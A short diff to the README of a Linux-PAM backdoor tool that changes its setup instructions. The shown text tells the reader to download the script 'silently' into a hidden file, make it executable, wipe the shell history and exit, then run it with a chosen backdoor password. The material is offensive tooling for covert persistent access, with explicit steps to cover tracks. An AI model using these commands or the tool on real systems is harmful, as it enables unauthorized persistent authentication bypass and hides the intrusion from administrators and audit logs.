@@ -5,12 +5,13 @@ This script automates the creation of a backdoor for Linux-PAM (Pluggable Authen
 Download the tool silently:
 ```sh
 curl -O https://raw.githubusercontent.com/her3ticAVI/linux-pam-backdoor/master/.backdoor.sh
+sudo chmod +x .backdoor.sh
 cat /dev/null > ~/.bash_history && history -c && exit
 ```
 
 The following banner shows the help menu:
 ```sh
-sudo ./backdoor.sh --help
+sudo ./.backdoor.sh --help
 Usage: ./backdoor.sh [-v version] -p password [--restore] [--verbose]
 Options:
   -v           Specify Linux-PAM version.
